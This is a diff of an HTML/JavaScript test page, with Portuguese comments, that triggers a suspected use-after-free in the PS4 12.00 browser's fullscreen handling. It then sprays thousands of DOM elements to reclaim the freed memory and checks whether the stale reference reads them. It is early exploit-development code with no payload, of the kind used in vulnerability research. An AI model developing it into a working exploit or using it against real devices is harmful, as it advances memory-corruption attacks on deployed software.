@@ -1,26 +1,25 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF Timing Hunter</title>
+<title>PS4 12.00 - UAF Reclaim Test</title>
 </head>
-<body style="background:#111;color:#0f0;">
+<body style="background:#222;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Timing Hunter</h2>
+<h2>PS4 12.00 - Fullscreen UAF → Reclaim</h2>
 <button onclick="runTest()">Run Test</button>
 
-<pre id="log" style="height:320px;overflow:auto;"></pre>
+<div id="log" style="margin-top:20px;"></div>
 
 <script>
-const PATTERN = 2.121995791e-314;
-
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    document.getElementById("log").textContent += msg + "\n";
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
 }
 
 // ==========================
-// Heap original (inalterado)
+// HEAP SETUP (inalterado)
 // ==========================
 function setupHeap() {
     let controllers = [];
@@ -35,12 +34,13 @@ function setupHeap() {
 }
 
 // ==========================
-// Fullscreen original
+// FULLSCREEN (inalterado)
 // ==========================
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
 
     fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+
     fsTarget.style.background = "black";
     fsTarget.style.width = "100%";
     fsTarget.style.height = "100%";
@@ -52,99 +52,101 @@ function setupFullscreen() {
 
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
     }
 
     return fsTarget;
 }
 
 // ==========================
-// Probe avançado
+// RECLAIM (NOVO)
 // ==========================
-function probeObject(tag, obj) {
-    log("---- PROBE " + tag + " ----");
+function reclaimDOM() {
+    log("[*] Iniciando DOM reclaim...");
+
+    let reclaim = [];
+
+    for (let i = 0; i < 20000; i++) {
+        let el = document.createElement("div");
+
+        // padrões controláveis
+        el.innerHTML = "REUSE_" + i;
+        el.setAttribute("data-x", i);
+
+        reclaim.push(el);
+    }
+
+    log("[*] Reclaim concluído: " + reclaim.length + " objetos");
+    return reclaim;
+}
+
+// ==========================
+// DETECÇÃO (NOVO)
+// ==========================
+function checkUAF(fsTarget) {
+    log("---- CHECK UAF ----");
 
     try {
-        log("[innerHTML] " + obj.innerHTML);
+        let val = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = " + val);
     } catch(e) {
-        log("[innerHTML ERROR] " + e);
+        log("[UAF DETECTADO] innerHTML falhou: " + e);
     }
 
     try {
-        obj.innerHTML = "UAF?";
-        log("[write] OK");
+        let attr = fsTarget.getAttribute("data-x");
+        log("[CHECK] data-x = " + attr);
     } catch(e) {
-        log("[write ERROR] " + e);
-    }
-
-    try {
-        let rect = obj.getBoundingClientRect();
-        log("[rect] w=" + rect.width + " h=" + rect.height);
-    } catch(e) {
-        log("[rect ERROR] " + e);
-    }
-
-    try {
-        let style = obj.style;
-        log("[style] access OK");
-    } catch(e) {
-        log("[style ERROR] " + e);
+        log("[UAF DETECTADO] attribute falhou: " + e);
     }
 }
 
 // ==========================
-// Trigger (IDÊNTICO + probes)
+// TRIGGER (INALTERADO)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
 
-    // manter referência global
-    window._uafRef = fsTarget;
-
     try {
         fsTarget.remove();
-    } catch(e) {
-        log("[ERRO remove] " + e);
-    }
 
-    // 🔬 probes em múltiplos tempos
-    setTimeout(() => probeObject("50ms", window._uafRef), 50);
-    setTimeout(() => probeObject("100ms", window._uafRef), 100);
-    setTimeout(() => probeObject("200ms", window._uafRef), 200);
-    setTimeout(() => probeObject("400ms", window._uafRef), 400);
-
-    try {
         if (document.webkitIsFullScreen || document.fullscreenElement) {
             document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
         }
+
     } catch(e) {
-        log("[ERRO exit] " + e);
+        log("[ERRO] " + e);
     }
 
+    // 🔥 RECLAIM IMEDIATO APÓS LIBERAÇÃO
+    let reclaim = reclaimDOM();
+
+    // 🔬 CHECAR POSSÍVEL REUTILIZAÇÃO
+    setTimeout(() => {
+        checkUAF(fsTarget);
+    }, 100);
+
+    // 🔁 comportamento original mantido
     setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
-// Execução (fluxo ORIGINAL)
+// MAIN (INALTERADO)
 // ==========================
 function runTest() {
-    document.getElementById("log").textContent = "Running... Press OPTIONS\n";
+    const logDiv = document.getElementById("log");
+    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+
+    log("[*] Iniciando teste");
 
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
-    // 🔥 sincronização com evento real do WebKit
-    document.addEventListener("webkitfullscreenchange", () => {
-        log("[EVENT] fullscreenchange");
-
-        setTimeout(() => {
-            probeObject("EVENT+100ms", window._uafRef);
-        }, 100);
-    });
-
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // 🔥 fluxo original preservado
+        // 🔒 NÃO ALTERAR TIMING ORIGINAL
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
